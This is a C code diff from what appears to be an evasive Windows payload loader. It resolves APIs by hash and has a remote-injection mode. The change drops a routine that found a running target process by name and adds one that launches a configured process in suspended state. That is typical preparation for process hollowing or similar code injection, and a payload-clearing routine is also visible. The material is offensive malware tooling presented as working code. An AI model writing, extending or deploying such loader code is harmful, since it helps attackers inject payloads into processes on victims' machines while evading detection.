@@ -10,12 +10,27 @@
 
 
 
+
 #ifdef REMOTE
 
-static inline void resolve_snapshot_apis(void) {
-    if (!g_ldr->apis->NtQuerySystemInformation)
-        g_ldr->apis->NtQuerySystemInformation = (pNtQuerySystemInformation)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTQUERYSYSTEMINFORMATION);
+static inline BOOL create_process(PHANDLE hProc, PHANDLE hThread, PDWORD pid) {
+    if (!g_ldr->apis->CreateProcessA)
+        g_ldr->apis->CreateProcessA = (pCreateProcessA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEPROCESSA);
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+
+    if (!g_ldr->apis->CreateProcessA(g_ldr->config->remoteSettings.ProcessName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        return FALSE;
+    }
+    *hProc = pi.hProcess;
+    *hThread = pi.hThread;
+    *pid = pi.dwProcessId;
+    return TRUE;
 }
+
+
+
 
 
 static inline HANDLE open_process_by_pid(DWORD pid) {
@@ -26,49 +41,7 @@ static inline HANDLE open_process_by_pid(DWORD pid) {
     return h;
 }
 
-#define SystemProcessInformation 5
 
-static inline HANDLE open_process_by_name(PWCHAR name, PDWORD chosenPid) {
-    ULONG bufferSize = 1024 * 1024;
-    PVOID buffer = g_ldr->apis->LocalAlloc(LPTR, bufferSize);
-    ULONG returnLength = 0;
-    NTSTATUS status;
-
-    while ((status = g_ldr->apis->NtQuerySystemInformation(
-        SystemProcessInformation,
-        buffer,
-        bufferSize,
-        &returnLength)) == STATUS_INFO_LENGTH_MISMATCH) {
-        g_ldr->apis->LocalFree(buffer);
-        bufferSize = returnLength + 4096;
-        buffer = g_ldr->apis->LocalAlloc(LPTR, bufferSize);
-    }
-
-    if (status != 0) {
-        g_ldr->apis->LocalFree(buffer);
-        return NULL;
-    }
-
-    HANDLE hProc = NULL;
-    PSYSTEM_PROCESS_INFORMATION proc = (PSYSTEM_PROCESS_INFORMATION)buffer;
-
-    while (1) {
-        if (proc->ImageName.Buffer && _wcsicmp(proc->ImageName.Buffer, name) == 0) {
-            hProc = open_process_by_pid((DWORD)(ULONG_PTR)proc->UniqueProcessId);
-            if (hProc) {
-                *chosenPid = (DWORD)(ULONG_PTR)proc->UniqueProcessId;
-                break;
-            }
-        }
-
-        if (proc->NextEntryOffset == 0)
-            break;
-        proc = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)proc + proc->NextEntryOffset);
-    }
-
-    g_ldr->apis->LocalFree(buffer);
-    return hProc;
-}
 
 static inline HANDLE resolve_target_process(PDWORD chosenPid) {
     if (g_ldr->config->remoteSettings.pid != 0) {
@@ -78,13 +51,6 @@ static inline HANDLE resolve_target_process(PDWORD chosenPid) {
             return h;
         }
         DBGA("[!] Failed to open PID %lu\n", g_ldr->config->remoteSettings.pid);
-    }
-
-    if (g_ldr->config->remoteSettings.ProcessName[0] != L'\0') {
-        HANDLE h = open_process_by_name(g_ldr->config->remoteSettings.ProcessName, chosenPid);
-        if (h)
-            return h;
-        DBGA("[!] Failed to open process by name\n");
     }
 
     return NULL;
@@ -171,3 +137,6 @@ static inline void clear_payload(LPVOID addr, DWORD size) {
     g_ldr->apis->LocalFree(addr);
 #endif
 }
+
+
+
